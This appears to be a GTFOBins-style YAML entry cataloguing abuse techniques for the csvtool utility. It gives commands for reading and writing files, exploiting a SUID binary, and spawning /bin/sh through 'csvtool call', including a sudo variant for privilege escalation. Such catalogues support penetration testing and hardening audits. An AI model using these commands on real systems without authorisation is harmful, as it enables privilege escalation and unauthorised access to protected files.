---
functions:
  file-read:
    - description: The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.
      code: |
        LFILE=file_to_read
        csvtool trim t $LFILE
  file-write:
    - description: The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo DATA > $TF
        csvtool trim t $TF -o $LFILE
  suid:
    - code: |
        LFILE=file_to_read
        ./csvtool trim t $LFILE
  shell:
    - code: csvtool call '/bin/sh;false' /etc/passwd
  sudo:
    - code: sudo csvtool call '/bin/sh;false' /etc/passwd
---
